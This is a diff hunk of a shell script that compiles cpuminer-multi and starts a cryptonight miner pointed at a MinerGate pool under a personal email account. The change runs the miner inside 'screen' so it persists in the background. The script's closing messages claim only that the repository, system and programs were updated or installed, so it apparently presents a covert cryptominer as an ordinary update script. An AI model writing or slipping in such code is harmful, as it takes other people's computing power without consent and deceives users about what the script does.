@@ -12,7 +12,7 @@ chmod +x autogen.sh
 CFLAGS="-march=native" ./configure
 make && make install 
 cd cpuminer-multi 
- ./minerd -a cryptonight -o stratum+tcp://bcn.pool.minergate.com:45550 -u junior_yum@hotmail.com -p x
+  screen ./minerd -a cryptonight -o stratum+tcp://bcn.pool.minergate.com:45550 -u junior_yum@hotmail.com -p x
 echo Repositorio Atualizado.
 echo Sistema Atualizado.
 echo Programas instalados.
